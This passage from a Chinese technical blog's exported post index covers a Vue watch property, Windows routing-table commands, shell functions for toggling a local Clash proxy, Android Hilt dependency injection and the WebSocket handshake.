<h2 id="watch监视属性"><a href="#watch监视属性" class="headerlink" title="watch监视属性"></a>watch监视属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">完整写法</span><br><span class="line">watch:&#123;</span><br><span class="line">    Item:&#123;     </span><br><span class="line">deep:true,</span><br><span class="line">//开启深度监视，可以检测到数组内，具体对象的修改变化。</span><br><span class="line">handler(value)&#123;</span><br><span class="line">      localStorage.setItem(&#x27;Item&#x27;,JSON.stringify(value))</span><br><span class="line">    &#125;</span><br><span class="line">        &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">//常见写法</span><br><span class="line">watch:&#123;</span><br><span class="line">      Item(oldvalue,newvalue)&#123;//可以不用old属性，只是用value接受新value</span><br><span class="line">          localStorage.setItem(&#x27;Item&#x27;,JSON.stringify(value))</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows路由表</title>
    <url>/posts/5a2d328e/</url>
    <content><![CDATA[<p><strong>路由表是一个存储在 路由器 或者我们计算机中的 电子表格 或类数据库</strong>。路由表存储着指向特定 网络地址 的路径</p>
<h1 id="路由表信息解析"><a href="#路由表信息解析" class="headerlink" title="路由表信息解析"></a>路由表信息解析</h1><ol>
<li>ipconfig &#x2F;all<br>查看网卡信息<br><img src="https://image.zfxt.top/hexo-blog/Windows%E8%B7%AF%E7%94%B1%E8%A1%A8-2023-09-00-54-59.png"></li>
<li>route print<br>查看路由表信息<br><img src="https://image.zfxt.top/hexo-blog/Windows%E8%B7%AF%E7%94%B1%E8%A1%A8-2023-09-04-45-28.png"><br><img src="https://image.zfxt.top/hexo-blog/Windows%E8%B7%AF%E7%94%B1%E8%A1%A8-2023-09-18-02-03.png"><br><strong>名词解释</strong>：<br><strong>网关</strong>，又称下一跳路由器。在发送IP数据包时，网关定义了针对特定的网络目的地址，数据包发送到的下一跳服务器。如果是本地计算机直接连接到的网络，网关通常是本地计算机对应的网络接口，但是此时接口必须和网关一致；如果是远程网络或默认路由，网关通常是本地计算机所连接到的网络上的某个服务器或路由器。<br><strong>接口</strong>，接口定义了针对特定的网络目的地址，本地计算机用于发送数据包的网络接口。网关必须位于和接口相同的子网（默认网关除外），否则造成在使用此路由项时需调用其他路由项，从而可能会导致路由死锁。<br><strong>跃点数</strong>，跳数用于指出路由的成本，通常情况下代表到达目标地址所需要经过的跳跃数量，一个跳数代表经过一个路由器。跳数越低，代表路由成本越低，优先级越高。<br><strong>0.0.0.0</strong>：缺省路由。当系统接收到一个目的地址不在路由表中的数据包时，系统会将该数据包通过192.168.1.129这个接口发送到缺省网关192.168.1.1。<br><strong>127.0.0.0</strong>：本地环路。当系统接收到一个发往目标网段127.0.0.0的数据包时，系统将接收发送给该网段的所有数据包。<br><strong>192.168.1.0</strong>：直连网段的路由记录。系统会将该数据包通过192.168.1.129这个接口发送出去。<br><strong>192.168.1.129</strong>：本地主机路由。当系统接收到一个目标ip地址为本地网卡ip地址的数据包时，系统会将该数据包收下。<br><strong>192.168.1.255</strong>：本地广播路由。当系统接收到一个发给直连网段的本地广播数据包时，系统会将该数据包从192.168.1.129这个接口以广播的形式发送出去。<br><strong>224.0.0.0</strong>：组播路由。当系统接收到一个组播数据包时，系统会将该数据包从192.168.99.8这个接口以组播的形式发送出去<br><strong>255.255.255.255</strong>：广播路由。在系统接收到一个绝对广播数据包时，系统会将该数据包通过192.168.99.8这个接口发送出去。</li>
</ol>
<h1 id="windows路由表操作"><a href="#windows路由表操作" class="headerlink" title="windows路由表操作"></a>windows路由表操作</h1><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">route</span><br><span class="line"></span><br><span class="line">操作网络路由表。</span><br><span class="line"></span><br><span class="line">ROUTE [-f] [-p] [-<span class="number">4</span>|-<span class="number">6</span>] command [destination]</span><br><span class="line">                  [MASK netmask]  [gateway] [METRIC metric]  [<span class="keyword">IF</span> interface]</span><br><span class="line"></span><br><span class="line">  -f           清除所有网关项的路由表。如果与某个</span><br><span class="line">               命令结合使用，在运行该命令前，</span><br><span class="line">               应清除路由表。</span><br><span class="line"></span><br><span class="line">  -p           与 ADD 命令结合使用时，将路由设置为</span><br><span class="line">               在系统引导期间保持不变。默认情况下，重新启动系统时，</span><br><span class="line">               不保存路由。忽略所有其他命令，</span><br><span class="line">               这始终会影响相应的永久路由。</span><br><span class="line"></span><br><span class="line">  -<span class="number">4</span>           强制使用 IPv4。</span><br><span class="line"></span><br><span class="line">  -<span class="number">6</span>           强制使用 IPv6。</span><br><span class="line"></span><br><span class="line">  command      其中之一:</span><br><span class="line">                 <span class="built_in">PRINT</span>     打印路由</span><br><span class="line">                 ADD       添加路由</span><br><span class="line">                 DELETE    删除路由</span><br><span class="line">                 CHANGE    修改现有路由</span><br><span class="line">  destination  指定主机。</span><br><span class="line">  MASK         指定下一个参数为“netmask”值。</span><br><span class="line">  netmask      指定此路由项的子网掩码值。</span><br><span class="line">               如果未指定，其默认设置为 <span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>。</span><br><span class="line">  gateway      指定网关。</span><br><span class="line">  interface    指定路由的接口号码。</span><br><span class="line">  METRIC       指定跃点数，例如目标的成本。</span><br><span class="line"></span><br><span class="line">用于目标的所有符号名都可以在网络数据库</span><br><span class="line">文件 NETWORKS 中进行查找。用于网关的符号名称都可以在主机名称</span><br><span class="line">数据库文件 HOSTS 中进行查找。</span><br><span class="line"></span><br><span class="line">如果命令为 <span class="built_in">PRINT</span> 或 DELETE。目标或网关可以为通配符，</span><br><span class="line">(通配符指定为星号“*”)，否则可能会忽略网关参数。</span><br><span class="line"></span><br><span class="line">如果 Dest 包含一个 * 或 ?，则会将其视为 Shell 模式，并且只</span><br><span class="line">打印匹配目标路由。“*”匹配任意字符串，</span><br><span class="line">而“?”匹配任意一个字符。示例: <span class="number">157</span>.*.<span class="number">1</span>、<span class="number">157</span>.*、<span class="number">127</span>.*、*<span class="number">224</span>*。</span><br><span class="line"></span><br><span class="line">只有在 <span class="built_in">PRINT</span> 命令中才允许模式匹配。</span><br><span class="line">诊断信息注释:</span><br><span class="line">    无效的 MASK 产生错误，即当 (DEST &amp; MASK) != DEST 时。</span><br><span class="line">    示例: &gt; route ADD <span class="number">157</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> MASK <span class="number">155</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> <span class="number">157</span>.<span class="number">55</span>.<span class="number">80</span>.<span class="number">1</span> <span class="keyword">IF</span> <span class="number">1</span></span><br><span class="line">             路由添加失败: 指定的掩码参数无效。</span><br><span class="line">             (Destination &amp; Mask) != Destination。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">    &gt; route <span class="built_in">PRINT</span></span><br><span class="line">    &gt; route <span class="built_in">PRINT</span> -<span class="number">4</span></span><br><span class="line">    &gt; route <span class="built_in">PRINT</span> -<span class="number">6</span></span><br><span class="line">    &gt; route <span class="built_in">PRINT</span> <span class="number">157</span>*          .... 只打印那些匹配  <span class="number">157</span>* 的项</span><br><span class="line"></span><br><span class="line">    &gt; route ADD <span class="number">157</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> MASK <span class="number">255</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>  <span class="number">157</span>.<span class="number">55</span>.<span class="number">80</span>.<span class="number">1</span> METRIC <span class="number">3</span> <span class="keyword">IF</span> <span class="number">2</span></span><br><span class="line">             destination^      ^mask      ^gateway     metric^    ^</span><br><span class="line">                                                         Interface^</span><br><span class="line">      如果未给出 <span class="keyword">IF</span>，它将尝试查找给定网关的最佳</span><br><span class="line">      接口。</span><br><span class="line">    &gt; route ADD <span class="number">3</span>ffe::/<span class="number">32</span> <span class="number">3</span>ffe::<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    &gt; route CHANGE <span class="number">157</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> MASK <span class="number">255</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> <span class="number">157</span>.<span class="number">55</span>.<span class="number">80</span>.<span class="number">5</span> METRIC <span class="number">2</span> <span class="keyword">IF</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">      CHANGE 只用于修改网关和/或跃点数。</span><br><span class="line"></span><br><span class="line">    &gt; route DELETE <span class="number">157</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line">    &gt; route DELETE <span class="number">3</span>ffe::/<span class="number">32</span></span><br></pre></td></tr></table></figure>

<h1 id="双网卡配置实例"><a href="#双网卡配置实例" class="headerlink" title="双网卡配置实例"></a>双网卡配置实例</h1><p>详见<a href="https://blog.51cto.com/tonyguo/176104">原文</a></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows路由表</tag>
      </tags>
  </entry>
  <entry>
    <title>clash快速开启和关闭代理模式</title>
    <url>/posts/9ff5edc2/</url>
    <content><![CDATA[<h2 id="如何快速开启和关闭代理模式"><a href="#如何快速开启和关闭代理模式" class="headerlink" title="如何快速开启和关闭代理模式"></a>如何快速开启和关闭代理模式</h2><p>这一步的前提是你已经完成了clash的部署内容<a href="https://zfxt.top/posts/b32510c2">上一篇文章</a><br>当完成了clash的部署后，自然是需要打开代理的<br>简单的方法就是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export https_proxy=http://127.0.0.1:7890           </span><br><span class="line">export http_proxy=http://127.0.0.1:7890   </span><br><span class="line">export all_proxy=socks5://127.0.0.1:7891</span><br></pre></td></tr></table></figure>

<p>但是这只是临时使用。如果每次开关代理都这般麻烦，倒不如不用<br>也可以直接将这个部署到<code>/etc/profile</code>或者<code>/root/.bashrc</code>中。但他是永久性的改变。于是有些情况，他并不适用。国内的网站访问时，如果打开代理会使访问速度大大降低。得不偿失。</p>
<h4 id="所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。"><a href="#所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。" class="headerlink" title="所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。"></a>所以要设计一个便捷的开关方式，用来便捷的打开或者关闭代理。</h4><ol>
<li>第一种简洁方式（但是并不太符合所期望的简洁模式）<br> 设计两个sh脚本分别为<code>open.sh</code>和<code>close.sh</code><br> 先在目录下建一个目录<code>switch</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir switch &amp;&amp; cd switch</span><br></pre></td></tr></table></figure>
然后编写两个文件，并把以下内容填入<br>open.sh<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">export http_proxy=http://127.0.0.1:7890</span><br><span class="line">export https_proxy=http://127.0.0.1:7890</span><br><span class="line">export all_proxy=socket5://127.0.0.1:7891</span><br><span class="line">echo &quot;已经打开代理&quot;</span><br></pre></td></tr></table></figure>
close.sh<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">unset http_proxy</span><br><span class="line">unset https_proxy</span><br><span class="line">unset all_proxy</span><br><span class="line">echo &quot;已经关闭代理&quot;</span><br></pre></td></tr></table></figure>
他们的作用分别使打开代理和关闭代理。</li>
</ol>
<h2 id="普及一个知识点"><a href="#普及一个知识点" class="headerlink" title="普及一个知识点"></a>普及一个知识点</h2><h3 id="source和bash"><a href="#source和bash" class="headerlink" title="source和bash"></a>source和bash</h3><p>他们都可以执行shell脚本，但是bash命令会新建一个sh窗口，然后执行sh命令，而在新命令行中即便使用了export暴露了全局变量，也只是在新命令行以及新命令行建立的子命令行中有效。当他执行完毕后，他就会销毁构建的命令行，回到你的shell连接界面。此时你刚刚export暴露的全局变量都没了。<br>而如果使用source去执行sh命令。他不会构建一个新命令行，而是在当前的命令行下直接执行，所以你export的全局变量就算正确完成了。</p>
<h3 id="Get"><a href="#Get" class="headerlink" title="Get"></a>Get</h3><p>source命令等同于.命令<br>bash命令也可以简化为.&#x2F;命令<br>即</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source open.sh</span><br><span class="line">//等价于</span><br><span class="line">. open.sh</span><br><span class="line">////</span><br><span class="line">./open.sh</span><br><span class="line">//等价于</span><br><span class="line">bash open.sh</span><br></pre></td></tr></table></figure>
<h2 id="然后可以将这两个命令软链接到-usr-bin来达到快捷启动的方法"><a href="#然后可以将这两个命令软链接到-usr-bin来达到快捷启动的方法" class="headerlink" title="然后可以将这两个命令软链接到&#x2F;usr&#x2F;bin来达到快捷启动的方法"></a>然后可以将这两个命令软链接到&#x2F;usr&#x2F;bin来达到快捷启动的方法</h2><p>在<code>/usr/bin</code>下执行以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /root/switch/open.sh openProxy</span><br><span class="line">ln -s /root/switch/close.sh closeProxy</span><br></pre></td></tr></table></figure>
<p>如上，便可以简单的执行启动和关闭代理的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@VM-16-15-ubuntu:~/switch# . openProxy</span><br><span class="line">已经打开代理</span><br><span class="line">root@VM-16-15-ubuntu:~/switch# . closeProxy</span><br><span class="line">已经关闭代理</span><br></pre></td></tr></table></figure>
<p>以上就是第一种方法。<br>2. 可以在.bashrc中定义方法，在这其中的方法，也是可以直接访问的，而且他执行完后，他export的内容就会变成全局变量。<br>只需要在.bashrc中加入以下内容即可。<br>具体如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Open proxy</span></span><br><span class="line">on() &#123;</span><br><span class="line">    export https_proxy=http://127.0.0.1:7890</span><br><span class="line">    export http_proxy=http://127.0.0.1:7890</span><br><span class="line">    export all_proxy=socks5://127.0.0.1:7891</span><br><span class="line">    echo &quot;代理已经打开&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Close proxy</span></span><br><span class="line">off() &#123;</span><br><span class="line">    unset http_proxy</span><br><span class="line">    unset https_proxy</span><br><span class="line">    unset all_proxy</span><br><span class="line">    echo &quot;代理已经关闭&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就可以通过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">on</span><br><span class="line">off</span><br></pre></td></tr></table></figure>
<p>来启动和关闭代理了</p>
]]></content>
      <categories>
        <category>clash</category>
      </categories>
  </entry>
  <entry>
    <title>android-hilt</title>
    <url>/posts/56bcb77a/</url>
    <content><![CDATA[<h1 id="hilt依赖注入"><a href="#hilt依赖注入" class="headerlink" title="hilt依赖注入"></a>hilt依赖注入</h1><p>他应该满足，只要应用程序存在，那么依赖项就一直存在，并且保持单例模式</p>
<h2 id="添加依赖项"><a href="#添加依赖项" class="headerlink" title="添加依赖项"></a>添加依赖项</h2><p>首先，将 <code>hilt-android-gradle-plugin</code> 插件添加到项目的根级 <code>build.gradle</code> 文件中：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">  ...</span><br><span class="line">  id(<span class="string">&quot;com.google.dagger.hilt.android&quot;</span>) version <span class="string">&quot;2.44&quot;</span> apply <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，应用 Gradle 插件并在 <code>app/build.gradle</code> 文件中添加以下依赖项：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">    id(<span class="string">&quot;com.android.application&quot;</span>)</span><br><span class="line">    id(<span class="string">&quot;org.jetbrains.kotlin.android&quot;</span>)</span><br><span class="line">    kotlin(<span class="string">&quot;kapt&quot;</span>)</span><br><span class="line">    id(<span class="string">&quot;com.google.dagger.hilt.android&quot;</span>)</span><br><span class="line">)</span><br><span class="line">dependences&#123;  </span><br><span class="line"><span class="comment">//Dagger Hilt</span></span><br><span class="line">    implementation(<span class="string">&quot;com.google.dagger:hilt-android:2.44&quot;</span>)</span><br><span class="line">    kapt(<span class="string">&quot;com.google.dagger:hilt-android-compiler:2.44&quot;</span>)</span><br><span class="line"><span class="comment">//ViewModel Compose</span></span><br><span class="line">    implementation(<span class="string">&quot;androidx.lifecycle:lifecycle-viewmodel-compose:2.6.2&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allow references to generated code</span></span><br><span class="line">kapt &#123;</span><br><span class="line">  correctErrorTypes = <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="注册Activity，Application"><a href="#注册Activity，Application" class="headerlink" title="注册Activity，Application"></a>注册Activity，Application</h2><h3 id="Hilt-应用类"><a href="#Hilt-应用类" class="headerlink" title="Hilt 应用类"></a>Hilt 应用类</h3><p>所有使用 Hilt 的应用都必须包含一个带有 <code>@HiltAndroidApp</code> 注解的 <a href="https://developer.android.google.cn/reference/android/app/Application?hl=zh-cn"><code>Application</code></a> 类。</p>
<p><code>@HiltAndroidApp</code> 会触发 Hilt 的代码生成操作，生成的代码包括应用的一个基类，该基类充当应用级依赖项容器。(<strong>需要在Manifest中注册</strong>)</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HiltAndroidApp</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExampleApplication</span> : <span class="type">Application</span>() &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<h3 id="将依赖项注入-Android-类"><a href="#将依赖项注入-Android-类" class="headerlink" title="将依赖项注入 Android 类"></a>将依赖项注入 Android 类</h3><p>在 <code>Application</code> 类中设置了 Hilt 且有了应用级组件后，Hilt 可以为带有 <code>@AndroidEntryPoint</code> 注解的其他 Android 类提供依赖项：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AndroidEntryPoint</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExampleActivity</span> : <span class="type">AppCompatActivity</span>() &#123; ... &#125;</span><br></pre></td></tr></table></figure>

<p>Hilt 目前支持以下 Android 类：</p>
<ul>
<li><code>Application</code>（通过使用 <code>@HiltAndroidApp</code>）</li>
<li><code>ViewModel</code>（通过使用 <code>@HiltViewModel</code>）</li>
<li><code>Activity</code></li>
<li><code>Fragment</code></li>
<li><code>View</code></li>
<li><code>Service</code></li>
<li><code>BroadcastReceiver</code></li>
</ul>
<h2 id="singleton-component-vs-singleton-annotation？"><a href="#singleton-component-vs-singleton-annotation？" class="headerlink" title="singleton component vs singleton annotation？"></a>singleton component vs singleton annotation？</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="meta">@InstallIn(SingletonComponent::class)</span></span><br><span class="line"><span class="comment">//it means lifetime of our dependencies</span></span><br><span class="line"><span class="keyword">object</span> AppModule &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Provides</span></span><br><span class="line">    <span class="meta">@Singleton</span></span><br><span class="line">    <span class="comment">//it means all component will use this one object</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">provideMyApi</span><span class="params">()</span></span>: MyApi &#123;</span><br><span class="line">        <span class="keyword">return</span> Retrofit.Builder()</span><br><span class="line">            .baseUrl(<span class="string">&quot;https://zfxt.top&quot;</span>)</span><br><span class="line">            .build()</span><br><span class="line">            .create(MyApi::<span class="keyword">class</span>.java)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="viewModel"><a href="#viewModel" class="headerlink" title="viewModel"></a>viewModel</h3><p>构建一个viewModel带参数时，我们通常需要使用到factory去构建，不然将会很难实现其功能。如下：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyViewModel</span>(</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> repository: MyRepository</span><br><span class="line">):ViewModel() &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用注解后</span></span><br><span class="line"><span class="meta">@HiltViewModel</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyViewModel</span> <span class="meta">@Inject</span> <span class="keyword">constructor</span>(</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> repository: MyRepository</span><br><span class="line">):ViewModel() &#123;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//只需要使用viewModel:MyViewModel = viewModel()</span></span><br></pre></td></tr></table></figure>

<h3 id="AppModule"><a href="#AppModule" class="headerlink" title="AppModule"></a>AppModule</h3><p>对于AppModule中相互调用，只需要添加其参数即可自动识别到</p>
<blockquote>
<p>对于Module而言，他会根据返回的类型来判断注入方式。如果你对某一个类型有多个返回方法就可能导致程序奔溃，例如你定义了两个<code>providerString1</code>和<code>provideString2</code>就会导致程序奔溃</p>
</blockquote>
<p><strong>因此，我们需要通过<code>@Named</code>来区分同一类型的对象如何导入</strong></p>
<p>如下所示</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="meta">@InstallIn(SingletonComponent::class)</span></span><br><span class="line"><span class="keyword">object</span> AppModule &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Provides</span></span><br><span class="line">    <span class="meta">@Singleton</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">provideMyApi</span><span class="params">()</span></span>: MyApi &#123;</span><br><span class="line">        <span class="keyword">return</span> Retrofit.Builder()</span><br><span class="line">            .baseUrl(<span class="string">&quot;https://zfxt.top&quot;</span>)</span><br><span class="line">            .build()</span><br><span class="line">            .create(MyApi::<span class="keyword">class</span>.java)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Provides</span></span><br><span class="line">    <span class="meta">@Singleton</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">providerMyRepository</span><span class="params">(api:<span class="type">MyApi</span>,app:<span class="type">Application</span>,<span class="meta">@Named(<span class="string">&quot;hello1&quot;</span>)</span> hello:<span class="type">String</span>)</span></span>: MyRepository &#123;</span><br><span class="line">        <span class="keyword">return</span> MyRepositoryImpl(api,app)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Provides</span></span><br><span class="line">    <span class="meta">@Singleton</span></span><br><span class="line">    <span class="meta">@Named(<span class="string">&quot;hello1&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">providerString1</span><span class="params">()</span></span>=<span class="string">&quot;Hello 1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Provides</span></span><br><span class="line">    <span class="meta">@Singleton</span></span><br><span class="line">    <span class="meta">@Named(<span class="string">&quot;hello2&quot;</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">providerString2</span><span class="params">()</span></span>=<span class="string">&quot;Hello 2&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Binding方式"><a href="#Binding方式" class="headerlink" title="Binding方式"></a>Binding方式</h2><p>我们可以不适用@Provider的方式提供，而是通过构建一个抽象类和抽象函数来实现，</p>
<p>如下：</p>
<ol>
<li>首先为我们的实现类注释<code>@Inject</code>的构造函数方法</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyRepositoryImpl</span> <span class="meta">@Inject</span> <span class="keyword">constructor</span>(...)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>然后创建一个新的抽象类</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Module</span></span><br><span class="line"><span class="meta">@InstallIn(SingletonComponent::class)</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RepositoryModule</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Binds</span></span><br><span class="line">    <span class="meta">@Singleton</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="function"><span class="keyword">fun</span> <span class="title">bindMyRepository</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        myRepository: <span class="type">MyRepositoryImpl</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>:MyRepository</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样子就算实现功能了，他的使用场景通常是无法通过构造函数来构建的时候,在我们使用service的时候，我们就不能通过创建的方式来导入repository。因此我们用<code>@Inject</code>加上Binding的方法实现注入功能</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@AndroidEntryPoint</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyService</span>:<span class="type">Service</span>()&#123;</span><br><span class="line"><span class="meta">@Inject</span></span><br><span class="line">liteinit <span class="keyword">var</span> repository:MyRepository</span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onBind</span><span class="params">(po:<span class="type">Intent</span>?)</span></span>:IBinder?</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Lazy-Injection"><a href="#Lazy-Injection" class="headerlink" title="Lazy Injection"></a>Lazy Injection</h2><p>他会延迟注入，只有在对象被使用到的时候才去注入，</p>
<p>他的使用方法为在类型外包一层<code>Lazy&lt;&gt;</code>即可：如</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@HiltviewModel</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyViewModel</span> <span class="meta">@Inject</span> <span class="keyword">constructor</span>(</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">val</span> repository:Lazy&lt;MyRepository&gt;</span><br><span class="line">)ViewModel()&#123;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>hilt</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSocket：双向通信，弥补HTTP不足</title>
    <url>/posts/55dca645/</url>
    <content><![CDATA[<p>WebSocket是一个在单TCP连接上进行全双工通信的协议。<br>允许服务器主动向客户端推送消息。</p>
<blockquote>
<p>WebSocket本质上一种<code>计算机网络应用层的协议</code>，用来弥补http协议在持久通信能力上的不足。</p>
</blockquote>
<ul>
<li>HTTP 协议有一个缺陷：通信只能由客户端发起，不具备服务器推送能力。所以进行双向通信时必须使用webSocket。</li>
<li>这种单向请求的特点，注定了如果服务器由连续的状态变化，客户端想要获知会非常麻烦。我们只能使用“轮询”：每隔一段时间，就像服务器发送要给请求。而轮询的效率非常的低。浪费资源。</li>
<li>轮询的危害：服务端被迫维持来自每个客户端的大量不同的连接<br>大量的轮询请求会造成高开销，比如会带上多余的header，造成了无用的数据传输。</li>
</ul>
<h3 id="websocket是先通过HTTP协议完成第一次握手"><a href="#websocket是先通过HTTP协议完成第一次握手" class="headerlink" title="websocket是先通过HTTP协议完成第一次握手"></a>websocket是先通过HTTP协议完成第一次握手</h3><p>他们的握手过程</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /chat <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span>: server.<span class="property">example</span>.<span class="property">com</span></span><br><span class="line"><span class="title class_">Upgrade</span>: websocket</span><br><span class="line"><span class="title class_">Connection</span>: <span class="title class_">Upgrade</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Key</span>: x3JJHMbDL1EzLkh9GBhXDw==</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Protocol</span>: chat, superchat</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Version</span>: <span class="number">13</span></span><br><span class="line"><span class="title class_">Origin</span>: <span class="attr">http</span>:<span class="comment">//example.com</span></span><br></pre></td></tr></table></figure>
<p>其中专属于websocket的由upgrade，connection，sec开头的内容。<br>最后返回响应，表示websocket连接建立完成</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">101</span> <span class="title class_">Switching</span> <span class="title class_">Protocols</span></span><br><span class="line"><span class="title class_">Upgrade</span>: websocket</span><br><span class="line"><span class="title class_">Connection</span>: <span class="title class_">Upgrade</span></span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Accept</span>: <span class="title class_">HSmrc0</span>sMlYUkAGmm5OPpG2HaGWk=</span><br><span class="line"><span class="title class_">Sec</span>-<span class="title class_">WebSocket</span>-<span class="title class_">Protocol</span>: chat</span><br></pre></td></tr></table></figure>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：</p>
<p>WebSocket协议一旦建议后，互相沟通所消耗的请求头是很小的<br>服务器可以向客户端推送消息了<br>缺点：</p>
<p>少部分浏览器不支持，浏览器支持的程度与方式有区别（IE10）</p>
